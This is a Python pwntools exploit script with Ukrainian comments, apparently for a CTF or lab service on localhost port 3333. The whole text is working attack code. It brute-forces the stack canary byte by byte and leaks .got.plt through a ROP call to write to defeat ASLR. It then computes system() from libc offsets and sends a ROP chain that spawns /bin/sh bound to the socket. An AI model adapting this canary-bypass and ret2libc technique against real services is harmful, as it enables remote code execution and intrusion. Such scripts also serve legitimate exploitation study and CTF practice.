#!/usr/bin/env python3

from pwn import *

# Вказуємо хост і порт
HOST = '127.0.0.1'
PORT = 3333

# Шеллкод для запуску /bin/sh
cmd = b"/bin/sh <&4 >&4 2>&4"

# Функція для пошуку канарки
def brute_canary(canary=b'\0'):
    if len(canary) == 4:
        return canary
    buf = b'A' * 30 + canary
    for c in range(256):
        context.log_level = 'error'
        r = remote(HOST, PORT)
        r.send(buf + bytes([c]))
        out = r.readall()
        context.log_level = 'info'
        
        # Логувати лише, коли знайдена канарка
        if b'bye' in out:
            log.info(f'Found canary byte {c:02x}')
            return brute_canary(canary + bytes([c]))

    return None  # Якщо не знайдена канарка

# Функція для витоку адреси
def leak(canary, addr, size):
    r = remote(HOST, PORT)
    buf = b'A' * 30 + canary + b'B' * 4
    buf += p32(0x0804858C)  # _write
    buf += p32(0xdeadbeef)
    buf += p32(4)  # socket fd
    buf += p32(addr)
    buf += p32(size)

    r.send(buf)
    r.recvuntil('think so')
    out = r.readall()
    return out[1: size + 1]

# Обхід канарки
c = brute_canary()
if c is not None:
    log.info(f'Canary {c.hex()}')
else:
    log.error('Failed to find canary')

# Обхід ASLR
plt = leak(c, 0x0804A000, 0x50)
log.info('Leaked .got.plt')
print(hexdump(plt, width=12))

# Витягування адреси system() з .got.plt
system = u32(plt[8:12]) - 0x000f5ae0 + 0x00045830
log.info(f'system() at 0x{system:x}')

# Побудова ROP-ланцюга для обходу NX
rw = 0x804a060  # writable buffer

buf = b'A' * 30 + c + b'B' * 4
buf += p32(0x080485DC)  # _read
buf += p32(0x08048bb6)  # pop-pop-pop-ret gadget
buf += p32(4)  # socket fd
buf += p32(rw)
buf += p32(len(cmd))
buf += p32(system)
buf += p32(0xdeadc0de)
buf += p32(rw)

log.info('ROP chain')
print(hexdump(buf, width=12))

# Відправлення експлоїту
r = remote(HOST, PORT)
print("Sending data to server...")
r.send(buf)
print("Data sent, waiting for response...")
r.send(cmd)
r.interactive()  # Переходимо в інтерактивний режим
